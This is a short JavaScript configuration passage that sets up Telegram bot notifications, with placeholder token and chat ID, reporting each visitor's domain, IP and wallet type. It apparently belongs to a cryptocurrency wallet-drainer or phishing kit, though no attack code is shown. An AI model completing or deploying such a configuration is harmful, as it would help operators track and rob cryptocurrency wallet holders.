...
// Replace Discord webhook with Telegram settings
const telegramBotToken = "YOUR_BOT_TOKEN_HERE"; // Your Telegram bot token from @BotFather
const telegramChatId = "YOUR_CHAT_ID_HERE"; // Your Telegram chat ID where notifications will be sent

// Optional: Customize notification template
const telegramNotificationTemplate = {
    enableEmoji: true, // Set to false if you don't want emoji in notifications
    messageFormat: `
🌍 Domain: {domain}
✉️ IP: {ip}
💰 Wallet: {walletType}
...
const feedbackEnabled = true; // keep enabled to receive Telegram notifications
